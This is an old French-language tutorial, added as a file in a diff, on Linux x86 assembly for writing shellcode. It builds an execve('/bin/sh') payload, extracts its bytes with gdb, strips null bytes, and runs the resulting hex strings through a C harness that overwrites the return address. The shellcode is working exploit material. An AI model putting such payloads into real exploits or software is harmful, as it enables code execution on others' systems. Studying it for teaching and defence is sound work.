@@ -1,0 +1,398 @@
+/***************************************************************************
+
+                           Programmation ASM sous Linux
+                          (orienté pour faire des shellcodes)
+                                       (Texte Version 2)
+                             --------------------
+    begin                : 20/05 2001
+    copyright            : (C) 2001 by Anti-Social
+    email                : cronos56@yahoo.com
+    site                 : www.nether.net/~lionel56/
+ ***************************************************************************/
+
+ L'asm est un langage de programmation de bas niveau.
+ Il est utilisé pour faire des applications rapide en exécution, mais
+ il est aussi beaucoup utilisé dans l'informatique industriel.
+ Le texte expliquera surtout comment programmer des petites applications simple,
+ pour en arriver a faire des shellcodes sous Linux...
+
+ 1- Quelques bases
+ _________________
+
+ Il est important avant de commencer d'avoir une base en asmx86, si
+ ce n'est pas votre cas allez voir sur www.clickmicro2000.com une doc d'introduction
+ a l'asm sous dos ou linux peut importe.
+ Voici un rappel rapide:
+ En asm nous avons des registres (eax , ecx ,edx , ebx , esp , ebp)...
+ Différente instruction:
+ mov => deplace une donnée
+ jmp => fait un saut dans le code (ex: jmp 5 saute a la 5eme lignes dans
+                                       le code)
+ call => va sur une fonction
+ push => pousser une donnée sur la pile
+ pop => prendre une donnée sur la pile
+ int => exécution (ex: int 21h pour win et linux int 80h)
+ ret => fin de la fonction retourne a la fonction qui avait demandé...
+
+ 2- Outils indispensable
+ _______________________
+
+ GDB est un outil utile au debuggage ou pour comprendre un code que
+ vous avez fait en C pour le voir en ASM...
+ NASM est un compilateur asm pour linux.
+ GCC compilateur final.
+ Un editeur de texte c'est mieux :)
+
+ 3- Base ASM 2 + Premier code
+ ____________________________
+
+ Toutes nos fonctions utilisables en ASM sont dans unistd.h et /usr/include/asm/.
+
+ /* Pris de unistd.h */
+ #define __NR_exit		  1
+ #define __NR_fork		  2
+ #define __NR_read		  3
+ #define __NR_write		  4
+ #define __NR_open		  5
+ #define __NR_close		  6
+ #define __NR_waitpid		  7
+ #define __NR_creat		  8
+ ...
+ /* FIN */
+
+ 2eme information importante:
+ Exemple nous voulons faire une apps en ASM qui dit bonjour!
+ Nous allons donc regarder dans unistd.h la fonction la plus approprié.
+ C'est write, nous allons faire un man sur write:
+
+ #include <unistd.h>
+
+ ssize_t write(int fd, const void *buf, size_t count);
+                 ^            ^               ^
+         EBX    _|            |               |
+                     ECX     _|               |
+                                   EDX       _|
+
+ Pour définir la fonction a exécuter nous devons remplir toujours comme cela:
+
+ EAX == numero de la fonction (4 pour write)
+ EBX == 1ere argument (ici fd donc 1 pour écrire à l'ecran)
+ ECX == 2eme argument (ici le buffer donc BONJOUR!)
+ EDX == 3eme argument (ici la taille de notre buffer donc 8)
+
+ Notre programme:
+
+ [global main]
+ main:
+ mov eax, 4 ; met write dans eax
+ mov ebx, 1 ; met 1 dans ebx fd = 1
+ mov ecx, msg ; met msg dans ecx donc *buf = bonjour!
+ mov edx, 8 ; met 8 dans edx (strlen(buf))
+ int 80h ; execute le tous
+ ret 0 ; return 0
+ msg db "Bonjour!"
+
+ [Anti-Social@]$ nasm -f aout -o salut.o salut.asm
+ [Anti-Social@]$ gcc -o salut salut.o
+ [Anti-Social@]$ ./salut
+ Bonjour!
+
+ 4- SHELLCODE
+ ____________
+
+ On prend
+ #define __NR_execve              11
+ Donc:
+ EAX = 11
+
+ man execve:
+ #include <unistd.h>
+
+ int execve (const char *fichier, char * constargv [], char * constenvp[]);
+
+ Donc:
+ EBX = "/bin/sh"
+ ECX = {"/bin/sh",0}
+ EDX = 0
+
+ global main
+ main:
+ jmp addr
+ start:
+ pop ebx    ; prend /bin/sh sur la pile
+ xor esi, esi  ; fou 0 dans esi
+ mov [ebp+0x0c], ebx  ; fou ebx dans ebp+10
+ mov [ebp+0x10], esi  ; fou 0 a ebp+0x10 pour edx et pour la fin de ebp+10 (taille prise sur le code)
+ lea ecx,[ebp+0x0c] ; copie ebp+10 dans ecx
+ lea edx,[ebp+0x10] ; copie 0 dans edx
+ mov eax, 0xb     ; copie 11(execve) dans eax
+ int 80h ; lance  ; lance
+ addr:
+ call start
+ msg db "/bin/sh",0
+
+ [Anti-Social@]$ nasm -f aout -o shell.o shell.asm
+ [Anti-Social@]$ gcc -o shell shell.o
+ [Anti-Social@]$ ./shell
+ sh$
+
+ Après il faudra virer les caractères NULL de notre shellcode...
+
+ 5- Passer notre code ASM dans notre exploit
+ -------------------------------------------
+
+   a) Il ne doit avoir aucun caractère null(x00) dans notre shellcode!
+   b) Le désassembler avec gdb:
+   (gdb)x/bx main
+   (gdb) x/bx main
+	0x8048420 <main>:       0xe9
+	(gdb)
+	0x8048421 <main+1>:     0x16
+	(gdb)
+	0x8048422 <main+2>:     0x00
+	(gdb)
+	0x8048423 <main+3>:     0x00
+	(gdb)
+	0x8048424 <main+4>:     0x00
+	(gdb)
+	0x8048425 <main+5>:     0x5b
+	(gdb)
+	0x8048426 <main+6>:     0x31
+	(gdb)
+	0x8048427 <main+7>:     0xf6
+	(gdb)
+	0x8048428 <main+8>:     0x89
+	(gdb)
+	0x8048429 <main+9>:     0x5d
+	(gdb)
+	0x804842a <main+10>:    0x0c
+	(gdb)
+	0x804842b <main+11>:    0x89
+	(gdb)
+	0x804842c <main+12>:    0x75
+	(gdb)
+	0x804842d <main+13>:    0x10
+	(gdb)
+	0x804842e <main+14>:    0x8d
+	(gdb)
+	0x804842f <main+15>:    0x4d
+	(gdb)
+	0x8048430 <main+16>:    0x0c
+	(gdb)
+	0x8048431 <main+17>:    0x8d
+	(gdb)
+	0x8048432 <main+18>:    0x55
+	(gdb)
+	0x8048433 <main+19>:    0x10
+	(gdb)
+	0x8048434 <main+20>:    0xb8
+	(gdb)
+	0x8048435 <main+21>:    0x0b
+	(gdb)
+	0x8048436 <main+22>:    0x00
+	(gdb)
+	0x8048437 <main+23>:    0x00
+	(gdb)
+	0x8048438 <main+24>:    0x00
+	(gdb)
+	0x8048439 <main+25>:    0xcd
+	(gdb)
+	0x804843a <main+26>:    0x80
+	(gdb)
+	0x804843b <main+27>:    0xe8
+	(gdb)
+	0x804843c <main+28>:    0xe5
+	(gdb)
+	0x804843d <main+29>:    0xff
+	(gdb)
+	0x804843e <main+30>:    0xff
+	(gdb)
+	0x804843f <main+31>:    0xff
+
+	Se qui donne:
+	"\xe9\x16\x00\x00\x00\x5b\x31\xf6\x89\x5d\x0c\x89\x75\x10\x8d\x4d\x0c\x8d\x55"
+	"\x10\xb8\x0b\x00\x00\x00\xcd\x80\xe8\xe5\xff\xff\xff/bin/sh";
+
+	Dans un code:
+	/* ShellCode By Anti-Social */
+	char antisocial[]=
+	"\xe9\x16\x00\x00\x00\x5b\x31\xf6\x89\x5d\x0c\x89\x75\x10\x8d\x4d\x0c\x8d\x55"
+	"\x10\xb8\x0b\x00\x00\x00\xcd\x80\xe8\xe5\xff\xff\xff/bin/sh";
+	int main()
+	{
+
+		int *ret;
+  		printf("ShellCode by Anti-Social\n");
+  		ret = (int *)&ret + 2;
+  		(*ret) = (int)antisocial;
+	}
+	[]$cc -o shellcode shellcode.c
+	[]$./shellcode
+		ShellCode by Anti-Social
+		sh$
+	Le probleme ici vient des caractères NULL(0x00) qu'il faut éliminer!
+	=>
+	/* Shell2.asm */
+
+	main:
+ 	jmp short addr
+ 	start:
+ 	pop ebx    ; prend /bin/sh sur la pile
+ 	xor eax, eax  ; fou 0 dans eax  car obligatoire apparemment quand on utilise al
+	              ; on utilise eax a la place de esi pour par redeclar� un autre reg...
+ 	mov [ebp+0x0c], ebx  ; fou ebx dans ebp+10
+ 	mov [ebp+0x10], eax  ; fou 0 a ebp+0x10 pour edx et pour la fin de ebp+10 (taille prise sur le code)
+ 	lea ecx,[ebp+0x0c] ; copie ebp+10 dans ecx
+ 	lea edx,[ebp+0x10] ; copie 0 dans edx
+ 	mov al, 0xb     ; copie 11(execve) dans al
+ 	int 80h ; lance
+ 	addr:
+ 	call start
+ 	msg db "/bin/sh"
+
+	=>>>
+
+	/* Shellcode II By Anti-Social */
+	char antisocial[]=
+	"\xeb\x13\x5b\x31\xc0\x89\x5d\x0c\x89\x45\x10\x8d\x4d\x0c\x8d\x55\x10\xb0"
+ 	"\x0b\xcd\x80\xe8\xe8\xff\xff\xff/bin/sh";
+	int main()
+	{
+
+		int *ret;
+  		printf("ShellCode II by Anti-Social\n");
+  		ret = (int *)&ret + 2;
+  		(*ret) = (int)antisocial;
+	}
+	[]$cc -o shellcode2 shellcode2.c
+	[]$./shellcode2
+		ShellCode II by Anti-Social
+		sh$
+6- Methode d'aide
+ -----------------
+
+  Quand l'on coince sur des shellcodes plus complexe, il est bien d'utiliser gdb avec un code d'exemple en C.
+
+  Voici l'exemple pour notre shellcode ici mais cette methode s'applique aussi dans d'autre cas de shellcode...
+  a)Le code:
+
+    /* Shell */
+     main()
+        {
+                char *cmd[] = {"/bin/sh",0};
+                execve("/bin/sh", cmd, 0);
+        }
+    /* */
+    []$cc -static -ggdb -o shell sh.c  ; ./shell     /* -> -static -ggdb c'est pour pourvoir désassembler toutes
+    					les fonctions meme celle "qui ne sont pas dans le code"
+                                                                        */
+    sh$
+
+  b)
+   []$gdb shell
+   (gdb) disassemble main
+	Dump of assembler code for function main:
+	0x80481dc <main>:       push   %ebp
+	0x80481dd <main+1>:     mov    %esp,%ebp
+	0x80481df <main+3>:     sub    $0x8,%esp
+	0x80481e2 <main+6>:     lea    0xfffffff8(%ebp),%eax
+	0x80481e5 <main+9>:     movl   $0x808b228,0xfffffff8(%ebp)
+	0x80481ec <main+16>:    movl   $0x0,0xfffffffc(%ebp)
+	0x80481f3 <main+23>:    sub    $0x4,%esp
+	0x80481f6 <main+26>:    push   $0x0
+	0x80481f8 <main+28>:    lea    0xfffffff8(%ebp),%eax
+	0x80481fb <main+31>:    push   %eax
+	0x80481fc <main+32>:    push   $0x808b228
+	0x8048201 <main+37>:    call   0x804c36c <__execve>  /* Apelle Execve avec les paramètres */
+	0x8048206 <main+42>:    add    $0x10,%esp
+	0x8048209 <main+45>:    leave
+	0x804820a <main+46>:    ret
+	End of assembler dump.
+   (gdb)disassemble __execve
+	Dump of assembler code for function __execve:
+	0x804c36c <__execve>:   push   %ebp
+	0x804c36d <__execve+1>: mov    $0x0,%eax
+	0x804c372 <__execve+6>: mov    %esp,%ebp
+	0x804c374 <__execve+8>: test   %eax,%eax
+	0x804c376 <__execve+10>:        push   %edi
+	0x804c377 <__execve+11>:        push   %ebx
+	0x804c378 <__execve+12>:        mov    0x8(%ebp),%edi
+	0x804c37b <__execve+15>:        je     0x804c382 <__execve+22>
+	0x804c37d <__execve+17>:        call   0x0
+	0x804c382 <__execve+22>:        mov    0xc(%ebp),%ecx
+	0x804c385 <__execve+25>:        mov    0x10(%ebp),%edx
+	0x804c388 <__execve+28>:        push   %ebx
+	0x804c389 <__execve+29>:        mov    %edi,%ebx
+	0x804c38b <__execve+31>:        mov    $0xb,%eax /* func execve */
+	0x804c390 <__execve+36>:        int    $0x80 /* execute !!! */
+	0x804c392 <__execve+38>:        pop    %ebx
+	0x804c393 <__execve+39>:        mov    %eax,%ebx
+	0x804c395 <__execve+41>:        cmp    $0xfffff000,%ebx
+	0x804c39b <__execve+47>:        jbe    0x804c3ab <__execve+63>
+	0x804c39d <__execve+49>:        neg    %ebx
+	0x804c39f <__execve+51>:        call   0x80483bc <__errno_location>
+	0x804c3a4 <__execve+56>:        mov    %ebx,(%eax)
+	0x804c3a6 <__execve+58>:        mov    $0xffffffff,%ebx
+	0x804c3ab <__execve+63>:        mov    %ebx,%eax
+	0x804c3ad <__execve+65>:        pop    %ebx
+	0x804c3ae <__execve+66>:        pop    %edi
+	0x804c3af <__execve+67>:        pop    %ebp
+	0x804c3b0 <__execve+68>:        ret
+	End of assembler dump.
+   (gdb)
+   /* le but du jeu c de break avant l'execution et apres pour regarder l'etat des registres pour voir ou et
+      comment sont mises les données!
+   */
+   (gdb) break *0x804c390
+   (gdb) break *0x804c392
+   (gdb) run
+   	Breakpoint 1 ****
+   (gdb) info reg
+	eax            0xb      11    /* notre eax = 11 (execv) ca c'est bon :o) */
+
+	ecx            0xbffff9e0       -1073743392 /*   (gdb) x/s 0xbffff9e0
+							 0xbffff9e0:      "(%/1iso8859-15�\b\b"
+						     */
+
+	edx            0x0      0                   /* EDX = 0 Ca c'est bon aussi :) */
+
+	ebx            0x808b228        134787624   /*  0x808b228 = /bin/sh
+							movl   $0x808b228,0xfffffff8(%ebp)
+							(gdb) x/s 0x808b228
+							0x808b228 <_IO_stdin_used+4>:    "/bin/sh"
+       						     */
+
+	esp            0xbffff9bc       0xbffff9bc
+	ebp            0xbffff9c8       0xbffff9c8
+	esi            0xbffffa54       -1073743276
+	edi            0x808b228        134787624   /* idem que ebx car:
+							0x804c388 <__execve+28>:        push   %ebx
+							0x804c389 <__execve+29>:        mov    %edi,%ebx
+       						     */
+
+	eip            0x804c390        0x804c390
+
+
+Rappel des besions:
+ EBX = "/bin/sh"
+ ECX = {"/bin/sh",0}
+ EDX = 0
+
+ Comme on peut le voir on est bon!!!!
+ cette methode ne sert pas vraiment a verifier si on est bon mais plutot a trouver ce qui doit allez dans
+ quel registre quand l'on n'a pas beaucoup de doc sur celle-ci!
+
+
+
+
+ 7- Conlusion
+ ------------
+
+ Il faut surtout etre très organisé pour faire ca bien et vite.
+ Personnelement de faire un shellcode pour un exploit n'est pas tres utilie car de nos jours beaucoup de shellcode
+ de tous types exsitent.Mais ca peut defois etre tres utilie pour faire des shellcode tres speciaux...
+ Un texte qui ma beaucoup plus est celui de Sebsb de Exile2k qui a fait un tres bon texte a mon gout tres bien
+ expliqué que je conseil à tous le monde.
+
+ @Anti-Social@
+
